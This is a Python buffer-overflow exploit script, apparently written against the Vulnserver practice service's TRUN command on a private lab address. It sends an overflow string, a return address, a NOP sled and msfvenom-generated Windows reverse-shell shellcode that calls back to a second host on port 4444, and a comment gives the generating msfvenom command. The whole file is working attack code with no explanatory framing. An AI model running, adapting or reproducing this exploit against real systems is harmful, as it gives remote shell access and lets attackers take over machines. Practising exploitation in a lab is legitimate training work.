#!/usr/bin/python3

import sys, socket
from time import sleep
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.44.129 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
buf =(
b"\xb8\x4f\xb1\x86\x86\xdb\xd7\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x42\x0e\x03\x0d\xbf\x64\x73\x6d\x57\xea"
b"\x7c\x8d\xa8\x8b\xf5\x68\x99\x8b\x62\xf9\x8a\x3b\xe0\xaf\x26"
b"\xb7\xa4\x5b\xbc\xb5\x60\x6c\x75\x73\x57\x43\x86\x28\xab\xc2"
b"\x04\x33\xf8\x24\x34\xfc\x0d\x25\x71\xe1\xfc\x77\x2a\x6d\x52"
b"\x67\x5f\x3b\x6f\x0c\x13\xad\xf7\xf1\xe4\xcc\xd6\xa4\x7f\x97"
b"\xf8\x47\x53\xa3\xb0\x5f\xb0\x8e\x0b\xd4\x02\x64\x8a\x3c\x5b"
b"\x85\x21\x01\x53\x74\x3b\x46\x54\x67\x4e\xbe\xa6\x1a\x49\x05"
b"\xd4\xc0\xdc\x9d\x7e\x82\x47\x79\x7e\x47\x11\x0a\x8c\x2c\x55"
b"\x54\x91\xb3\xba\xef\xad\x38\x3d\x3f\x24\x7a\x1a\x9b\x6c\xd8"
b"\x03\xba\xc8\x8f\x3c\xdc\xb2\x70\x99\x97\x5f\x64\x90\xfa\x37"
b"\x49\x99\x04\xc8\xc5\xaa\x77\xfa\x4a\x01\x1f\xb6\x03\x8f\xd8"
b"\xb9\x39\x77\x76\x44\xc2\x88\x5f\x83\x96\xd8\xf7\x22\x97\xb2"
b"\x07\xca\x42\x14\x57\x64\x3d\xd5\x07\xc4\xed\xbd\x4d\xcb\xd2"
b"\xde\x6e\x01\x7b\x74\x95\xc2\x44\x21\xb9\x93\x2d\x30\xc1\x82"
b"\xf1\xbd\x27\xce\x19\xe8\xf0\x67\x83\xb1\x8a\x16\x4c\x6c\xf7"
b"\x19\xc6\x83\x08\xd7\x2f\xe9\x1a\x80\xdf\xa4\x40\x07\xdf\x12"
b"\xec\xcb\x72\xf9\xec\x82\x6e\x56\xbb\xc3\x41\xaf\x29\xfe\xf8"
b"\x19\x4f\x03\x9c\x62\xcb\xd8\x5d\x6c\xd2\xad\xda\x4a\xc4\x6b"
b"\xe2\xd6\xb0\x23\xb5\x80\x6e\x82\x6f\x63\xd8\x5c\xc3\x2d\x8c"
b"\x19\x2f\xee\xca\x25\x7a\x98\x32\x97\xd3\xdd\x4d\x18\xb4\xe9"
b"\x36\x44\x24\x15\xed\xcc\x44\xf4\x27\x39\xed\xa1\xa2\x80\x70"
b"\x52\x19\xc6\x8c\xd1\xab\xb7\x6a\xc9\xde\xb2\x37\x4d\x33\xcf"
b"\x28\x38\x33\x7c\x48\x69") 

shellcode = b"A"*2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 +buf 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.44.128',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send(payload)
	s.close()

except:
	print ("Error on connection to server")
	sys.exit()
